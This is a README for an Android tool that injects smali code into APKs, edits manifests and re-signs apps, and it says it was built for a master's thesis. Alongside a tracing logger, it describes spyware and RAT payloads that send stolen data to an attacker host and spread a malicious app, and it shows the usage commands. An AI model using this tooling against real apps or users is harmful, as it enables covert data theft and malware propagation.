# Smali Code Injector 
## Automate assembly code injections within Android applications. 

The original purpose of this project was to automate the injection of stacktraces withing Andrdoid apps. Adding stacktraces helps in the process of reverse engineering and gives a good understanding of applications logic and workflow. Indeed, being able to obtain (log and print out) applications runtime method calls as well as the returned value would allow an attacker to save a considerable amount of time when reverse engineering complex Android applications and performing advanced code analysis. 

Lately, I improved SCI by adding new features and payloads to attempt to fully automate assembly code injections. As a result I ended up with this highly customisable modular framework that allows the creation/use of any assembly payload. Consequently, a user familiar with Android development could use SCI to create its own module and automate its payload injection without having to worry about the registers dependancie, type, etc.

### Automation for a better world
The code injection is performed at the assembly level (smali files). Which makes the identification of applications modified using SCI complicated and time consuming. This would require considerable of work (mainly network, permissions, signature and code analysis).

A high level overview of the different steps performed by SCI when injecting codes are:
* Disassembling the application
* Collecting relevant information about the application. 
	* Classes name.
	* Methods name.
	* Registers number and type.
	* etc.
* Editing the AndroidManifest.xml to add permissions, services and broadcastReceivers (depending on the payload requirements).
* Injecting and tweaking up the selected payload within the targeted method(s).
* Reassembling and signing the app with a valid self-signed certificate.

## Usage
### Examples:
To inject a payload:

		$ python3 sci.py -a [app] -t [target] -k [keyword] -p [payload] -rh [remote_host] -d [download_link]
	[-a]: 	Android applicaion to modify.
	[-t]: 	smali file within the application where to perform the injection. If this argument is absent, the injection is performed within the whole app.
	[-k]: 	keywords to filter on. Ex: if -k "SSL,X509TrustManager" the payload will only be injected on the method containing SSL in their declaration header -help for certificate unpinning-.
	[-p]: 	payload to use. 
	[-rh]:  IP address of the attacker/script for sending the stolen data.
	[-d]:	link to download the malicious app -to propagate the malware-.

	Tip: Inject the rat on the onCreate() method of the main activity

To inject the Spyware:

		$ python3 sci.py -a [app] -t [target] -k [keyword] -p spyware -rh [script] -d [download_link]

	
	[-rh]: 	IP of the remote receiver (or URL of the file responsible for the JSON data handling and parsing (a script example can be found under /scripts/handler.php -don't forget to change the settings to connect to your DB-).
    [-d]:	link with the malicious app. 

To inject the Logger:

		$ python3 sci.py -a [app] -t [target] -k [keyword] -p logger

	Note: Connect your phone to your computer and use the following command to filter and print out only the modified app runtime method calls:

		$ adb logcat | grep "::trace

To identify the main activity location (works even with obfuscated app):

		$ python3 sci.py -a [apps] -s
		
To display the help menu:

		$ python3 sci.py  -h

## Dependencies
### Third-party libraries
#### progressbar:
You need to install the progressbar package available at the link below. Alternatively, you can also comment out every lines linked to the use of this library in the **payload.py** file.
	
<http://code.google.com/p/python-progressbar/>

Installation on Linux (debian):

	$ sudo apt-get install python3-progressbar -y

## Future Improvements
* Add new payloads (reverse shell).
* Source code optimisation.

## Project Information
This framework was developed in the context of my master thesis work in July 2015.
